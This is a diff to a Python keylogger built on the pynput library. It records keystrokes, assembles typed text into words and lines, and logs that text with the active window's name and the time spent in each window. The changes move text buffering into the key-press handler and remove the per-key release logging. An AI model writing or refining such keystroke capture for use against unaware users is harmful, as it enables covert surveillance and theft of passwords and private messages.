@@ -43,21 +43,7 @@ def log_time_spent_on_window(window_name, start_time):
     log_event(f"Time spent on {window_name}: {time_spent:.2f} seconds")
 
 def on_press(key):
-    global active_window_name, active_window_start_time
-    try:
-        new_window_name = get_active_window_process_name()
-        if new_window_name != active_window_name:
-            log_time_spent_on_window(active_window_name, active_window_start_time)
-            active_window_name = new_window_name
-            active_window_start_time = time.time()
-        log_event(f"Key pressed: {key.char} in {active_window_name}")
-    except AttributeError:
-        log_event(f"Special key pressed: {key} in {active_window_name}")
-    except Exception as e:
-        logging.error(f"Error in on_press: {e}")
-
-def on_release(key):
-    global current_text, active_window_name, active_window_start_time
+    global active_window_name, active_window_start_time, current_text
     try:
         new_window_name = get_active_window_process_name()
         if new_window_name != active_window_name:
@@ -70,12 +56,20 @@ def on_release(key):
             current_text.append(' ')
         elif key == keyboard.Key.enter:
             current_text.append('\n')
+    except Exception as e:
+        logging.error(f"Error in on_press: {e}")
 
+def on_release(key):
+    global current_text, active_window_name, active_window_start_time
+    try:
+        new_window_name = get_active_window_process_name()
+        if new_window_name != active_window_name:
+            log_time_spent_on_window(active_window_name, active_window_start_time)
+            active_window_name = new_window_name
+            active_window_start_time = time.time()
         if key == keyboard.Key.space or key == keyboard.Key.enter:
             log_event(f"Text input: {''.join(current_text)} in {active_window_name}")
             current_text.clear()
-
-        log_event(f"Key released: {key} in {active_window_name}")
         if key == keyboard.Key.esc:
             return False
     except Exception as e:
